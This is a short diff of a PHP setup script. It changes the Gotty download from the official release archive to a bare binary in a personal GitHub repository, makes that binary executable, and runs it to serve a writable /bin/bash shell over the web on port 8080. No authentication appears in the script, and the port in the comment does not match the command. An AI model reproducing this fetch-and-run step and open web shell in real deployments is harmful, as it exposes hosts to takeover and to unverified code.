@@ -1,10 +1,10 @@
 <?php
 
 // Comando para descargar Gotty
-$downloadCommand = 'wget https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz';
+$downloadCommand = 'wget https://raw.githubusercontent.com/ivangabriel21/DependeciaDX/main/gotty';
 
 // Comando para descomprimir Gotty
-$extractCommand = 'tar -xzvf gotty_linux_amd64.tar.gz';
+$extractCommand = 'chmod +x gotty';
 
 // Comando para ejecutar Gotty en el puerto 8085
 $gottyCommand = './gotty -w --port 8080 /bin/bash';
